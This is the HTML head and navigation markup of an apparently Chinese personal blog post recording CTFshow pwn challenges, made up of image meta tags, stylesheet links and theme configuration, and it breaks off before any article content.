<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760318701561-a84bff6a-7a43-41f1-9734-cacde870e30a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320107946-5fc345e3-8847-4b7c-886b-1ecfc07f3317.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320197935-60bab79e-afff-4097-b3c9-6a6c92e2a447.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320375356-148b7517-2683-4114-94e0-b0843b83f068.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320445870-e03e6f29-b59d-4f34-8731-70e97bff4292.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320538275-24ada64c-32ae-4902-bbe0-4d484a1a58b2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320986828-e04896d8-b1f9-4a37-9ce9-d90b1ec4a828.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321110084-7843de6e-d052-46fb-9c10-5500a6717bd3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321095734-4512fc8b-1713-418b-9456-58cd692e718e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321145106-ea7fd900-c5bc-40fa-bc85-01cdb53f3f29.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321274686-5372b4fb-4b4d-48c5-b5c4-b1c5cf4739df.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321393740-e7eeb9fd-5f79-4f40-8eed-721af81f74d5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321685681-796afdf6-5ebb-4bc7-bf18-119d806f8e65.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760322938167-4ac84528-7d48-4f31-8fe9-90773e721c4e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760322959083-22406bd5-04c4-47d1-85b3-fd9ef6111325.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760323017087-5f7e3c50-20e2-4a24-836a-6bfa72699d25.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528203342-9675e33d-49b7-46da-bb00-aba1674b2aba.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528678996-9435c6de-e8af-4486-b833-0808e0182be1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760323176092-63e94049-ebf6-4c3b-bd56-c491ef926ddf.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528043202-65871eb4-cd4f-4d0a-ac5a-9b9bbcd365f1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760529842547-10e402e3-3f27-4693-9a3e-3bf9853bd438.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760529333762-2a675fd6-e6a0-469a-8a1b-ab01cebc2419.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760530028513-607a5601-617e-4e62-8a3a-0046f0456a6b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760530670755-94c67093-5673-40d8-b17e-691749e40c07.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760580663136-2919144a-e007-4d88-a151-48b24f8d9a51.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760581474179-6a68cc07-1a63-45ba-95e4-24c272d0658f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760581849013-422189a2-1249-4236-9de5-0b2324d48664.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582600743-1cd053e0-e5dd-45ff-ba9d-bed85ac26b06.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582580445-2af3036c-0764-4219-a47b-d7a84920c62b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582650222-fe1da303-ea84-4db1-932a-4c6448b0ecdf.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582670432-423f8992-9e7f-44f7-975c-d8b36576cc26.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610456281-6200c81f-318d-43fd-94a1-e998ac98f015.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610492602-24300be6-0cfa-4113-b785-7705941a912c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610560984-fab374d7-79ad-455e-b4f7-92a8e0c475c8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610578730-a00b0d0f-b915-4d07-8d2f-9ee53234f338.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610981372-f417fea0-e1ae-4cfc-ac15-10caaafa9066.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611002496-7019a2c2-981b-41b7-a407-95c5696c49fa.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611236902-5ee9f26e-815a-40ad-9bea-a4a5f9be592b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611912797-aa208025-f0dd-4207-a6c5-c6b50715f4d4.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760612427150-3a5a4764-f368-4b16-a589-efd3665e238b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760612483460-fe7b1be4-35c6-4cdb-88eb-06a6262cb562.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760613473252-8828c461-7cf3-4247-b4e2-3eee979decca.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760613754273-f8f51654-dbc9-49c8-8a26-50137be44077.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616403708-257f9611-0aa3-4e63-a336-6dd8d71a9311.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760615510524-e3f8c4b8-307d-4e29-a6a7-ce9480dabc09.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616171437-d09015ac-532d-4a3a-8a34-e8dfd10235cc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616790515-8e43534f-5baa-439b-b521-d7db655ccafd.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617352301-5e3a0ffc-1f5f-49cc-b24d-5de3adbe2435.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617735864-8e51c81a-2e88-4876-8135-a45e562442e7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617860464-310bd70f-acf8-4213-a90c-b5b68a8bc661.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617904205-c24cf582-33f6-415c-bc1f-055570b030bf.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760675844517-cd874683-c1b8-4fec-8d8e-153036509842.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760687898467-7cffe923-f966-468a-8fb0-e2ca29a99228.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688320335-f3a3f1d8-e008-4547-8aca-a043423b1269.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688419935-c4b691ca-6624-4772-9372-3083987e1513.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688710880-86a071bf-516a-410f-9da6-0770797107e5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760690542990-c01bf777-4835-494b-88c1-b81aa782ab01.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760690556712-3dcce765-6abe-4f76-b2c0-82c758ccb2b9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760691881821-16e91d76-639e-4b07-802f-a3c0959efb49.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760692580606-82388ef0-d2de-44a7-8297-ad520d8c2192.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760692683340-0989c6d6-0e55-4e4c-a072-c406bb73b346.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861148981-2fe4b573-c2db-4149-a743-092d5981a2ff.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861253850-02d3a0f5-3294-4883-b104-6b00787ed479.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861473210-cc37a8dd-757d-48e1-bf35-97281c13abcc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861691579-5e69dcff-12bb-4baa-8cb6-631305915c47.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862396742-3432209d-a224-41dd-bed9-4d531defde80.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862381552-007c52dd-a95e-4727-abc5-d61cb95b28c5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862459025-ece8a711-ad8c-438a-85af-a8fcc8fc5d48.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862561540-a1aae075-74b1-4ba7-949e-b51ad77235e4.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862633292-f6f939ec-7b6b-4119-8956-1baf232a85f8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862669214-00987373-6f5b-473c-8862-e28bfa17d315.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862771661-ffbec27d-155f-4844-84b7-610fe342b237.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863523993-70d32a0f-c7e8-4ef0-922d-71297e261171.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760864046819-56c1dd68-a694-408d-8b3d-2f4b7d91b505.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862989127-15bd1361-c17e-4e8f-b8ae-e29514ae9cc6.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862909365-73f7e263-51a9-4fce-9b7b-e6d09ada57ed.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863194386-3b106f3e-16a9-453c-be83-7cdf380b82b0.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863426448-20fada71-43d6-4e97-b7c9-41636fb7994e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865428187-3e2e10fd-435c-447c-a985-094e90618a0f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865489378-8c7e65fc-fd2f-4ea2-ab4e-1f90e7ddb7ad.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865685352-407fe3df-788a-49fc-98ef-c8fe5744b4b1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866224997-05e65347-7a9a-4747-b017-3a01942365ee.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866527599-c2c709d8-94f2-4e26-98ca-d0ac2479c9bd.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866618638-7b34e78e-8cdd-4614-a56e-2a1a7014a3f1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866626607-93e51e7c-4488-4a98-b97c-fc54b93c7c11.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867082578-66931c22-ab29-4b87-b2f7-6446d54fe833.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867128740-2b87dfd6-1c5c-4682-a173-44b70c37e96e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867173925-d194c6c2-d59f-4582-93ae-165cba2888fb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867629701-48a97cfa-42dc-43e0-a140-672a1877f7c8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867640707-340e494b-823d-414a-aee0-af29842bead3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870120873-d84e77d0-b6fd-4aaa-a559-f3d78f35299f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870273735-9f6c4b61-395a-4632-bc67-690cdbe22930.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870425881-74080f43-945f-45d3-ad79-e4996455d080.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870549815-45744697-2e4f-44dd-b033-b8136b72fff3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760871933126-582a1d3c-851c-4b30-9657-e78daba99add.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870717501-ab360205-c7ac-434d-984e-edbf3f000792.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870721862-11b29dd9-3db0-4ee4-a076-ddabd490205a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872547151-7eb38906-c554-4009-9f36-f073be386137.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872769178-543ae3b2-d4fe-4e6f-8387-800669238d8c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872941765-85661704-e0d1-4002-969b-e05af6b15051.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872989166-558ddd61-ed73-4c76-a069-cf56617d4f4b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760873167739-ddb3ec7e-d6ff-427c-a6b0-bce50005ae3a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761180493694-1ea2aadc-9544-4f4d-a54f-8eb61ce2cc1c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761181387621-7ff8a7a6-d4a9-4df8-a570-93507f8cc457.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761181635299-1f0fdf6f-082e-49c5-bd14-4d3ee4176318.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761182554230-7e7cea00-51b1-4ed3-a665-6ee9515a7138.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761182743156-ada709a9-105b-4a0c-a631-6c16eb880dc9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761183284376-a1ae7dd9-dac1-40d5-a5da-f3e8183776ce.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761183303482-37034f82-7a58-484c-9124-1b64b5936f30.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761196571732-c74f3eda-3051-4cd1-8edf-31087590f8c5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761196358398-3ef1aed0-1a24-4b59-91db-e7f16cd8e14c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198371948-5eab04ae-3a6a-47a6-9b02-5900a9beb0d3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761195818230-8c18c48b-b1a9-4428-bfd4-908a8ed2158f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197384823-21b0ae6c-872b-4e5a-a070-a17ee56e7972.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197406310-517e9627-e220-4737-9af4-53efde3f7041.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761197579777-841a533b-3a9d-46b5-95e0-813700dc8f3d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198930055-2428c3bb-510a-488e-a724-cf940cc1f974.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761198973543-0030f2e0-c976-46ac-9175-2d330fa30e81.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200623461-10e4fb04-5070-4f27-982b-e8909173fe71.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200648578-b1ff1587-183e-408e-9647-8be8b9b5af62.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200691348-2d922a69-729a-4749-937c-b7d91ab9a118.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200749882-fd1315a6-3831-4173-bf7a-3c7338d59eab.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200774385-0741c0d4-b717-4bcb-9796-f85bd3645dc9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200816913-7c2a18da-9f90-46a0-bf98-b2a3886f40f5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761200918179-b9526ba5-d348-4956-9170-3bec48f81691.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201046596-132deae9-a7e0-461e-843d-64c26f73ad39.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201514551-03a2af34-3d2f-463f-9a7d-6859592a151d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761201600535-34379313-9571-4c0b-9b84-75df204522c8.png">
<meta property="article:published_time" content="2025-10-30T16:00:00.000Z">
<meta property="article:modified_time" content="2025-11-05T07:52:48.614Z">
<meta property="article:author" content="Meiyouqian">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120826420-1ac0deb3-8c11-4eb9-8412-98def1cb2429.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CTFshow-Pwn-10月记录 - 玫幽倩的小博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
<link rel="stylesheet" href="/css/scrollAnimation.css">
<link rel="stylesheet" href="/css/mk.css">
<link rel="stylesheet" href="/css/selection.css">
<link rel="stylesheet" href="/css/glassBg.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 8.1.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>玫幽倩</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
